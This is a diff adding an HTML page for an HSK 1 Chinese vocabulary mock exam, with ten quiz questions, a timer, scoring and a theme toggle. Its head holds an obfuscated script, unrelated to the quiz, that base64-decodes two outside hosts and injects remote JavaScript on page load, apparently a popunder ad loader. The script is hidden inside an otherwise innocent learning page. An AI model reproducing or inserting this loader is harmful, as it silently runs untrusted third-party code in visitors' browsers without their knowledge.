@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HSK 1 Mock Exam</title>
+  <script type="text/javascript" data-cfasync="false">
+  /*<![CDATA[/* */
+  (function(){var t=window,e="cd6ee060ba724175f3699c4800b65757",l=[["siteId",153-559*779*654-902+290080832],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],w=["d3d3LnhhZHNtYXJ0LmNvbS92eGl2ZWx5anMubWluLmNzcw==","ZDExZW5xMnJ5bXkweWwuY2xvdWRmcm9udC5uZXQvUVMvZW5xdWlyZS5taW4uanM="],u=-1,p,h,f=function(){clearTimeout(h);u++;if(w[u]&&!(1801553369000<(new Date).getTime()&&1<u)){p=t.document.createElement("script");p.type="text/javascript";p.async=!0;var d=t.document.getElementsByTagName("script")[0];p.src="https://"+atob(w[u]);p.crossOrigin="anonymous";p.onerror=f;p.onload=function(){clearTimeout(h);t[e.slice(0,16)+e.slice(0,16)]||f()};h=setTimeout(f,5E3);d.parentNode.insertBefore(p,d)}};if(!t[e]){try{Object.freeze(t[e]=l)}catch(e){}f()}})();
+  /*]]>/* */
+  </script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+    body.light { background: linear-gradient(145deg, #eef2ff 0%, #e0e7ff 100%); --bg-card: #ffffff; --bg-header: rgba(255,255,255,0.7); --text-primary: #1e1b4b; --text-secondary: #4f46e5; --border-light: #c7d2fe; --accent: #4f46e5; }
+    body.dark { background: linear-gradient(145deg, #0f172a 0%, #0b1120 100%); --bg-card: #1e293b; --bg-header: rgba(30,41,59,0.8); --text-primary: #e2e8f0; --text-secondary: #a5b4fc; --border-light: #334155; --accent: #818cf8; }
+    body { padding: 1.2rem; display: flex; flex-direction: column; align-items: center; background: var(--bg-header); }
+    .container { max-width: 800px; width: 100%; background: var(--bg-header); backdrop-filter: blur(12px); border-radius: 2rem; padding: 1.5rem; }
+    h1 { text-align: center; margin-bottom: 1rem; background: linear-gradient(135deg, var(--text-secondary), var(--accent)); -webkit-background-clip: text; background-clip: text; color: transparent; }
+    .timer { text-align: right; font-size: 1.2rem; font-weight: bold; margin-bottom: 1rem; color: var(--accent); }
+    .question { background: var(--bg-card); border-radius: 1rem; padding: 1rem; margin-bottom: 1rem; border: 1px solid var(--border-light); }
+    .options { margin: 0.5rem 0 0 1rem; }
+    .option { margin: 0.3rem 0; display: flex; align-items: center; gap: 0.5rem; }
+    .submit-btn, .reset-btn { background: var(--accent); color: white; border: none; padding: 0.5rem 1.5rem; border-radius: 2rem; cursor: pointer; margin-right: 1rem; }
+    .result { margin-top: 1rem; text-align: center; font-size: 1.1rem; }
+    .back-btn { background: var(--accent); color: white; border: none; padding: 0.5rem 1rem; border-radius: 2rem; cursor: pointer; margin-top: 1rem; }
+  </style>
+</head>
+<body class="light">
+<div class="container">
+  <h1>📝 HSK 1 Mock Exam</h1>
+  <div class="timer" id="timer">Time left: 10:00</div>
+  <div id="questionsContainer"></div>
+  <div style="display: flex; gap: 1rem; justify-content: center;">
+    <button id="submitBtn" class="submit-btn">Submit Exam</button>
+    <button id="resetBtn" class="reset-btn">Reset</button>
+  </div>
+  <div id="result" class="result"></div>
+  <button class="back-btn" onclick="window.location.href='hsk1.html'"><i class="fas fa-arrow-left"></i> Back to Hub</button>
+</div>
+<script>
+  const questions = [
+    { text: "“你好” means?", options: ["Good morning", "Hello", "Goodbye", "Thank you"], correct: 1 },
+    { text: "What is 3 in Chinese?", options: ["三", "四", "五", "六"], correct: 0 },
+    { text: "“老师” means?", options: ["Student", "Teacher", "Doctor", "Driver"], correct: 1 },
+    { text: "Choose the correct translation: 'I am a student.'", options: ["我是学生。", "你是学生。", "他是学生。", "她是学生。"], correct: 0 },
+    { text: "What is the pinyin for '谢谢'?", options: ["xièxie", "xiexie", "xièxiè", "xìexìe"], correct: 0 },
+    { text: "“喝水” means?", options: ["Eat rice", "Drink water", "Sleep", "Run"], correct: 1 },
+    { text: "Which means 'big'?", options: ["大", "小", "多", "少"], correct: 0 },
+    { text: "“你好吗？” is a question about?", options: ["Your name", "Your age", "How are you", "Where you live"], correct: 2 },
+    { text: "The measure word for people is?", options: ["个", "只", "条", "张"], correct: 0 },
+    { text: "“再见” means?", options: ["Hello", "Good morning", "Goodbye", "Thank you"], correct: 2 }
+  ];
+  let timeLeft = 600; // 10 minutes in seconds
+  let timerInterval = null;
+  let userAnswers = new Array(questions.length).fill(-1);
+  function renderQuestions() {
+    const container = document.getElementById('questionsContainer');
+    let html = '';
+    questions.forEach((q, idx) => {
+      html += `<div class="question"><div><strong>${idx+1}. ${q.text}</strong></div><div class="options">`;
+      q.options.forEach((opt, optIdx) => {
+        const checked = (userAnswers[idx] === optIdx) ? 'checked' : '';
+        html += `<div class="option"><input type="radio" name="q${idx}" value="${optIdx}" ${checked}><label> ${opt}</label></div>`;
+      });
+      html += `</div></div>`;
+    });
+    container.innerHTML = html;
+    // attach event listeners
+    questions.forEach((_, idx) => {
+      document.querySelectorAll(`input[name="q${idx}"]`).forEach(radio => {
+        radio.addEventListener('change', (e) => { userAnswers[idx] = parseInt(e.target.value); });
+      });
+    });
+  }
+  function startTimer() {
+    if (timerInterval) clearInterval(timerInterval);
+    timerInterval = setInterval(() => {
+      if (timeLeft <= 0) {
+        clearInterval(timerInterval);
+        alert("Time's up! Submitting exam.");
+        submitExam();
+      } else {
+        timeLeft--;
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        document.getElementById('timer').innerText = `Time left: ${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
+      }
+    }, 1000);
+  }
+  function submitExam() {
+    clearInterval(timerInterval);
+    let score = 0;
+    for (let i=0; i<questions.length; i++) {
+      if (userAnswers[i] === questions[i].correct) score++;
+    }
+    const percent = Math.round((score / questions.length)*100);
+    const passed = percent >= 60;
+    const resultDiv = document.getElementById('result');
+    resultDiv.innerHTML = `<strong>Your score: ${score}/${questions.length} (${percent}%)</strong><br>${passed ? '🎉 Congratulations! You passed!' : '😢 Keep practicing! You can retake the exam.'}`;
+    // Save best score
+    const best = localStorage.getItem('hsk1_exam_best') || 0;
+    if (percent > best) localStorage.setItem('hsk1_exam_best', percent);
+    resultDiv.innerHTML += `<br>🏆 Best score: ${best}%`;
+  }
+  document.getElementById('submitBtn').addEventListener('click', submitExam);
+  document.getElementById('resetBtn').addEventListener('click', () => {
+    userAnswers.fill(-1);
+    renderQuestions();
+    timeLeft = 600;
+    startTimer();
+    document.getElementById('result').innerHTML = '';
+  });
+  renderQuestions();
+  startTimer();
+  // Dark mode (simple)
+  const darkBtn = document.createElement('button');
+  darkBtn.innerHTML = '<i class="fas fa-moon"></i> Dark';
+  darkBtn.style.position = 'fixed'; darkBtn.style.bottom = '20px'; darkBtn.style.right = '20px';
+  darkBtn.style.background = 'var(--accent)'; darkBtn.style.color = 'white'; darkBtn.style.border = 'none'; darkBtn.style.borderRadius = '30px'; darkBtn.style.padding = '0.4rem 1rem'; darkBtn.style.cursor = 'pointer';
+  darkBtn.onclick = () => {
+    const isDark = document.body.classList.contains('dark');
+    if (isDark) { document.body.classList.remove('dark'); document.body.classList.add('light'); localStorage.setItem('hsk1_exam_theme', 'light'); }
+    else { document.body.classList.remove('light'); document.body.classList.add('dark'); localStorage.setItem('hsk1_exam_theme', 'dark'); }
+  };
+  document.body.appendChild(darkBtn);
+  const savedTheme = localStorage.getItem('hsk1_exam_theme');
+  if (savedTheme === 'dark') { document.body.classList.add('dark'); document.body.classList.remove('light'); }
+  else { document.body.classList.add('light'); document.body.classList.remove('dark'); }
+</script>
+</body>
+</html>
